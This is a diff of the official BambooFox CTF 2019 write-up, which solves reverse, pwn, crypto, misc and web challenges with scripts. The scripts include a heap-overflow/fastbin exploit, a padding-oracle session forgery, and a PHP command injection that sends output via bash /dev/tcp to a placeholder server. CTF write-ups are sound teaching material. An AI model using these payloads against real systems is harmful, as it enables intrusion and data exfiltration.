@@ -1,96 +1,98 @@
 ---
 title: 2019 BambooFox CTF Official Write Up
-date: '2019-01-07 10:35:22'
+date: '2020-01-07 10:35:22'
 layout: post
-categories: write-ups
-related_techniques: 
-  - pwn
-  - crypto
-  - reverse
-  - web
-  - misc
-authors: 
-  - djosix
-  - oalieno
-  - zeze
-  - lys0829
-  - billy
-  - seadog007
-  - frozenkp
-  - ss8650twtw
+related_technique:
+- pwn
+- crypto
+- web
+- misc
+- reverse
+categories:
+- write-ups
+authors:
+- djosix
+- oalieno
+- zeze
+- lys0829
+- billy
+- seadog007
+- frozenkp
+- ss8650twtw
 ---
 
 ## Reverse
 
 ### How2decompyle
+* Author: zeze
+
 1. see the info of the file downloaded from server
-```shell=
-> file decompyle
-decompyle.pyc: python 2.7 byte-compiled
-> mv decompyle decompyle.pyc
-> uncompyle5 decompyle.pyc
-```
-
+	```::shell
+	> file decompyle
+	decompyle.pyc: python 2.7 byte-compiled
+	> mv decompyle decompyle.pyc
+	> uncompyle6 decompyle.pyc
+	```
 2. use uncompyle6 to get the source code
-```python=
-# uncompyle6 version 3.4.0
-# Python bytecode 2.7 (62211)
-# Decompiled from: Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
-# [GCC 8.2.0]
-# Embedded file name: decompyle.py
-# Compiled at: 2019-09-22 20:18:03
-import string
-restrictions = [
- 'uudcjkllpuqngqwbujnbhobowpx_kdkp_',
- 'f_negcqevyxmauuhthijbwhpjbvalnhnm',
- 'dsafqqwxaqtstghrfbxzp_x_xo_kzqxck',
- 'mdmqs_tfxbwisprcjutkrsogarmijtcls',
- 'kvpsbdddqcyuzrgdomvnmlaymnlbegnur',
- 'oykgmfa_cmroybxsgwktlzfitgagwxawu',
- 'ewxbxogihhmknjcpbymdxqljvsspnvzfv',
- 'izjwevjzooutelioqrbggatwkqfcuzwin',
- 'xtbifb_vzsilvyjmyqsxdkrrqwyyiu_vb',
- 'watartiplxa_ktzn_ouwzndcrfutffyzd',
- 'rqzhdgfhdnbpmomakleqfpmxetpwpobgj',
- 'qggdzxprwisr_vkkipgftuvhsizlc_pbz',
- 'jerzhlnsegcaqzathfpuufwunakdtceqw',
- 'lbvlyyrugffgrwo_v_zrqvqszchqrrljq',
- 'aiwuuhzbszvfpidwwkl_wynlujbsbhfox',
- 'vmhrizxtiegxdxsqcdoiyxkffloudwtxg',
- 'tffjnabob_jbf_qiszdsemczghnjysmah',
- 'zrqkppvynlkelnevngwlkhgaputhoagtt',
- 'nl_oojyafwoqccbedijmigpedkdzglq_f',
- 'cksy_skctjlyxktuzchvstunyvcvabomc',
- 'ppcxleeguvhvhengmvac_bykhzqohjuei',
- '_clmaicjrrzhwd_fescyaejtbyefxyihy',
- 'hhopvwsmjtpjiffzatyhjrev_dwnsidyo',
- 'sjevtrmkkk_zjalxrxfovjsbcxjx_pskp',
- 'gnynwuuqypddbsylparpcczqimimqmvdl',
- 'bxitcmhnmanwuhvjxnqeoiimlegrmkjra']
-capital = [
- 0, 4, 9, 19, 23, 26]
-flag = raw_input('Please tell me something : ').lower()
-flag = flag.lower()
-if len(flag) != len(restrictions[0]):
-    print 'No......You are wrong orzzzzz'
-    exit(0)
-for f in range(len(flag)):
-    for r in restrictions:
-        if flag[f] not in string.lowercase + '_' or flag[f] == r[f]:
-            print 'No......You are wrong orzzzzzzzzzzzz'
-            exit(0)
+	```python=
+	# uncompyle6 version 3.4.0
+	# Python bytecode 2.7 (62211)
+	# Decompiled from: Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
+	# [GCC 8.2.0]
+	# Embedded file name: decompyle.py
+	# Compiled at: 2019-09-22 20:18:03
+	import string
+	restrictions = [
+	 'uudcjkllpuqngqwbujnbhobowpx_kdkp_',
+	 'f_negcqevyxmauuhthijbwhpjbvalnhnm',
+	 'dsafqqwxaqtstghrfbxzp_x_xo_kzqxck',
+	 'mdmqs_tfxbwisprcjutkrsogarmijtcls',
+	 'kvpsbdddqcyuzrgdomvnmlaymnlbegnur',
+	 'oykgmfa_cmroybxsgwktlzfitgagwxawu',
+	 'ewxbxogihhmknjcpbymdxqljvsspnvzfv',
+	 'izjwevjzooutelioqrbggatwkqfcuzwin',
+	 'xtbifb_vzsilvyjmyqsxdkrrqwyyiu_vb',
+	 'watartiplxa_ktzn_ouwzndcrfutffyzd',
+	 'rqzhdgfhdnbpmomakleqfpmxetpwpobgj',
+	 'qggdzxprwisr_vkkipgftuvhsizlc_pbz',
+	 'jerzhlnsegcaqzathfpuufwunakdtceqw',
+	 'lbvlyyrugffgrwo_v_zrqvqszchqrrljq',
+	 'aiwuuhzbszvfpidwwkl_wynlujbsbhfox',
+	 'vmhrizxtiegxdxsqcdoiyxkffloudwtxg',
+	 'tffjnabob_jbf_qiszdsemczghnjysmah',
+	 'zrqkppvynlkelnevngwlkhgaputhoagtt',
+	 'nl_oojyafwoqccbedijmigpedkdzglq_f',
+	 'cksy_skctjlyxktuzchvstunyvcvabomc',
+	 'ppcxleeguvhvhengmvac_bykhzqohjuei',
+	 '_clmaicjrrzhwd_fescyaejtbyefxyihy',
+	 'hhopvwsmjtpjiffzatyhjrev_dwnsidyo',
+	 'sjevtrmkkk_zjalxrxfovjsbcxjx_pskp',
+	 'gnynwuuqypddbsylparpcczqimimqmvdl',
+	 'bxitcmhnmanwuhvjxnqeoiimlegrmkjra']
+	capital = [
+	 0, 4, 9, 19, 23, 26]
+	flag = raw_input('Please tell me something : ').lower()
+	flag = flag.lower()
+	if len(flag) != len(restrictions[0]):
+			print 'No......You are wrong orzzzzz'
+			exit(0)
+	for f in range(len(flag)):
+			for r in restrictions:
+					if flag[f] not in string.lowercase + '_' or flag[f] == r[f]:
+							print 'No......You are wrong orzzzzzzzzzzzz'
+							exit(0)
 
-cap_flag = ''
-for f in range(len(flag)):
-    if f in capital:
-        cap_flag += flag[f].upper()
-    else:
-        cap_flag += flag[f]
+	cap_flag = ''
+	for f in range(len(flag)):
+			if f in capital:
+					cap_flag += flag[f].upper()
+			else:
+					cap_flag += flag[f]
 
-print 'Yeah, you got it !\nBambooFox{' + cap_flag + '}\n'
-# okay decompiling decompyle.pyc
-```
-
+	print 'Yeah, you got it !\nBambooFox{' + cap_flag + '}\n'
+	# okay decompiling decompyle.pyc
+	```
+	
 3. start reverse
 After reading the script, we will know that there are 26 strings in a list named restrictions, and we should input the flag then it outputs either `No......You are wrong orzzzzz` or `Yeah, you got it !\nBambooFox{XXX}`. 
 
@@ -134,26 +136,28 @@ Then see the 33 columns, you will get the flag.
 
 
 ### Move or not
+* Author: zeze
+
 1. Pass the first password check 98416
 2. Second one is to input the key. Just try from 0 to 256 to see which one does not abort with error.
-```python=
-# coding=utf-8
-from pwn import *
+	```::python=
+	# coding=utf-8
+	from pwn import *
 
-results = []
+	results = []
 
-for i in range(256):
-    r = remote('127.0.0.1', 30003)
-    r.recvuntil('First give me your password:')
-    r.sendline('98416')
-    r.sendlineafter('Second give me your key: ', str(i))
-    res = r.recvall(1)
-    if 'Then Verify your flag: ' in res:
-        print i
-        results.append(i)
+	for i in range(256):
+			r = remote('127.0.0.1', 30003)
+			r.recvuntil('First give me your password:')
+			r.sendline('98416')
+			r.sendlineafter('Second give me your key: ', str(i))
+			res = r.recvall(1)
+			if 'Then Verify your flag: ' in res:
+					print i
+					results.append(i)
 
-print results 
-```
+	print results 
+	```
 
 There should be 7 possibilities `[39, 43, 48, 50, 114, 117, 206]`.
 
@@ -165,6 +169,24 @@ There should be 7 possibilities `[39, 43, 48, 50, 114, 117, 206]`.
 
 ## Pwn
 
+### Land-2
+The score you can get is decide by the `_count` variable. So the goal in this challenge is to control `_count`.
+Use `area()` we can increase the global variable `_count`. We can increase `_count` to a number we know, then search the number in Bss section to find the location of `_count`. After we found the location of `_count`, we can do arbitrary write on it.
+We can call `area()` to find the answer. Set `_count` to zero before return the answer.
+The following code shows how to find the `_count`'s address.
+```c=
+int aaa[1]; 
+rectangle find_rectangle(){  
+    rectangle answer;  
+    for(int i=0;i<76;i++)area(0,0,1,1); 
+    int c = -2000; 
+    for(;c<=0;c++){ 
+        if(aaa[c]==76)break; 
+    } 
+    aaa[c] = 0; //aaa[c] == _count
+}
+```
+
 ### note
 
 The return value of snprintf is the size of characters printed, instead of the size written to the final string.
@@ -173,6 +195,7 @@ It will cause heap overflow vulnerability at `copy`.
 Leaking libc base address, and do fastbin attack to overwrite `__malloc_hook` to `one_gadget`.
 
 The `idx` and `size` value should be 0 to satisfy one_gadget limitation.
+
 ```python=
 from pwn import *
 import sys
@@ -317,7 +340,6 @@ syscall
 shellcraft.exit(0)
 ))
 r.interactive()
-
 ```
 
 ## Crypto
@@ -325,6 +347,7 @@ r.interactive()
 ### oracle
 
 RSA LSB oracle
+
 ```python
 #!/usr/bin/env python3
 from pwn import *
@@ -379,7 +402,82 @@ Then, you can brute force the last byte of the block to get the ciphertext and t
 
 ## Misc
 
+### Tree
+After some observation (`tree` command can help you), you can find it is a expression tree contains two operation. Every result is one ascii code in flag.
+```python=
+from os import listdir, chdir
+
+def solver(op):
+    files = listdir(".")
+    nums = []
+    for f in files:
+        type = f.split("_")[1]
+        if type == "number":
+            with open(f,"r") as fo:
+                nums.append(int(fo.read()))
+        else:
+            chdir(f)
+            nums.append(solver(type))
+            chdir("..")
+    if len(nums)==1:
+        return nums[0]
+    if op == "+":
+        return nums[0]+nums[1]
+    else:
+        return nums[0]*nums[1]
+
+#print(solver(""))
+
+flag = ""
+allf = listdir(".")
+#print(allf)
+
+for f in allf:
+    chdir(f)
+    flag += chr(solver(""))
+    chdir("..")
+print(flag)
+```
+
+### Land-WTF
+First, read the grader code, and read `main` function carefully.
+```c=
+int main() {
+    init();
+    int t,mx=0;
+    rectangle tmp;
+    _input(&t);
+    while(t--){
+        if(t%10==0)init();
+        *_count=rand()%8787,*xddddd=1;
+        _input(_a),_input(_b),_input(_c),_input(_d);
+        fillVM();
+        tmp=find_rectangle();
+        if(tmp.a!=*_a||tmp.b!=*_b||tmp.c!=*_c||tmp.d!=*_d)
+            _wrong_answer("incorrect place");
+        else
+            mx=_max(mx,*_count);
+    }
+    _Accepted(mx);
+}
+```
+We can found two things.
+First, the variable `mx` initial value is 0.
+Second, if input `t` is 0, then the main function will call `_Accepted` directly.
+So, if we can let input `t` = 0, then we can get Accepted and use 0 times query.
+We can call `main()` recursively. Because it is possible have some 0 in testdata, it is possible to let `t` = 0.
+```c=
+#include "Land.h" 
+
+int main(); 
+  
+rectangle find_rectangle(){ 
+    main(); 
+} 
+```
+
 ### AlphaGO
+* Author: zeze
 1. We get a picture like this
 
 ![](https://i.imgur.com/N3mXtrX.png)
@@ -414,14 +512,42 @@ Then, you can brute force the last byte of the block to get the ciphertext and t
 2. When trying to extract the zip, we find that it needs password
 3. Let's use a tool to find the password Ex. https://www.lostmypass.com/file-types/zip/
 4. Then get the password "blind" and extract the zip file
-5. get an image (which is a Braille)![](https://i.imgur.com/ub6dbYB.png =300x)
+5. get an image (which is a Braille)![](https://i.imgur.com/ub6dbYB.png)
 6. Then mapping them to letters and get the flag `BAMBOOFOX{YA_YOU_KNOW_WHAT_BLIND_MEANS}`
 
 ## Web
 
+### Web Newbie
+
+#### Recon
+
+Once access to the challenge, you will be redirected to `/myfirstweb/index.php?op=new`, where you can create a new post.
+
+After creating a new post, it'll redirect you to `/myfirstweb/index.php?op=view&file=<FILE>` where <FILE> is the name of the file you created earlier.
+
+By inspecting the HTML, you can see that there's actually four link on the navbar where the link to the hint page is commented out.
+
+#### Solution 
+
+First, let's see what's the hint: Flag is in `../flag.txt`.
+You might try to access `/myfirstweb/index.php?op=view&file=../flag.txt`, unfortunately, it responds with an error telling you Found flag format in content, no flag for you!.
+
+One might think of is to try to access the file with Local File Inclusion with `file=php://read=convert.base64-encode/resource=../flag.txt`.
+However, it gave you another error message: File not found!.
+
+How about trying to get index.php by LFI?
+By doing so, you will still get the same error message: File not found!.
+
+Since `index.php` is in a folder called myfirstweb, and the hint also told you the flag is in `../flag.txt`, why not try to access it directly with `/flag.txt`?
+
+Once you access the flag file directly, TA-DA, there's the flag!
+
+P.S. You might wonder why the error message returned by `php://` is File not found! instead of Found flag format in content, no flag for you!. That's because this challenge is written in Node.js, lol.
+
 ### Warmup
 
 Code:
+
 ```php
 <?php
 
@@ -432,13 +558,15 @@ Code:
 ```
 
 Use PHP [execution operator](https://www.php.net/manual/en/language.operators.execution.php) to execute arbitrary command
-```
+
+```php
 ?x=`$x`;sleep 1
 ?x=`$x`;bash -c 'ls > /dev/tcp/your-server.com/12345'
 ```
 
 And you will recieve:
-```
+
+```php
 BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
 index.php
 ```
@@ -448,8 +576,8 @@ index.php
 1. There was a `/.git` directory exposed publicly, and you can get `/.git/HEAD`. If you use directory scanner, you would probably find `/Makefile` as well.
 2. Source code is also under the document root, which can be viewed directly (`Makefile`, `log.asm`, `server.asm`, `http.asm`, `utils.asm`, `socket.asm`). It's a web server written in x86_64 assembly language.
 3. In `http.asm`, to retrieve a file, it just prepend `"."` to the path provided in the HTTP request. For example:
-    With		
-    ```
+    With
+    ```shell
     GET /index.html HTTP/1.1
     ...
     ```
@@ -462,7 +590,7 @@ index.php
 ### NEW
 
 1. `server.out` is a friendly binary assembled with `nasm`:
-    ```
+    ```shell
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
@@ -551,13 +679,13 @@ Our expected solution didn't work, sorry... But you can still write shellcode to
 
 1. Through several tests, you might find out that the session was encrypted using CBC mode with 16 bytes block size.
 2. Use padding oracle to decrypt the session:
-    https://github.com/djosix/padding_oracle.py		
-    ```
+    [https://github.com/djosix/padding_oracle.py](https://github.com/djosix/padding_oracle.py)
+    ```php
     a:2:{s:4:"show";b:0;s:4:"name";s:1:"a";}\x08\x08\x08\x08\x08\x08\x08\x08
     ```
     This is a serialized PHP array. It's clear that you need to modify `show` to 1.
 3. You can modify your name to fake a serialized PHP array and try to align it to a block with correct padding.
-    ```
+    ```php
     [      IV      ]a:2:{s:4:"show";b:0;s:4:"name";s:59:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01";}
     |               |               |               |               |               |               |               |
     0               16              32              48              64              80              96              112             128
@@ -565,11 +693,12 @@ Our expected solution didn't work, sorry... But you can still write shellcode to
     So the name should be `___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01` (the last `\x01` is PKCS#7 padding).
     After sending this string as name, you will recieve the session.
 4. Then you just remove 0-47 and 112- of the session. (48-63 will be treated as IV). The decrypted session would be:
-    ```
+    ```php
     a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01
     ```
 
 Exploit
+
 ```python
 import requests, sys
 
@@ -627,6 +756,7 @@ print(requests.get(URL, cookies={'session': urlencode(base64_encode(cipher))}).t
 ### Messy PHP
 There are lots of Unicode characters in the parameter, careful
 After removed comments and useless code, the code is
+
 ```php
 <?php
 
@@ -658,7 +788,8 @@ Also, the last xor is xor with the input `KEY`, we can just simply give \x00 to 
 
 
 We already mention that it has lots of Unicode characters in it, and the raw packet will look like this
-```HTTP
+
+```shell
 POST /index.php?KEY=%00 HTTP/1.1
 Host: 34.82.101.212
 Accept: */*
@@ -669,16 +800,19 @@ Connection: close
 ```
 
 We can use curl to send the request
+
 ```shell
 curl 'http://server/index.php?KEY=%00' --data-raw '%E2%80%8B%F0%9F%98%82=c4ca4238a0b923820dcc509a6f75849b&%F0%9F%A4%A3%E2%80%8B=1&%F0%9F%98%82=1&%F0%9F%A4%A3=1'
 ```
 
 Then the server will give a set of numbers
+
 ```
 843435546 2075703868 2068761948 735888953 1414869565 995844919 2011787626 1249952864 1471672898 865484610 82905966 1406731009 1711850813 1980158610 962580498 1095680930 936808370 541273572 1621099101 2058080657 107465805 2091610395 948091109 1602905557 2004172843 1894517632 1221478033 2047568514 787119479 427616689 755108574 2004186216 2071261550 929755589 1249328075
 ```
 
 since the server might have time different with your local computer, we can just try every possible random seed in last one minute. (And yes, it's enough to paste it by hand)
+
 ```php
 <?php
 
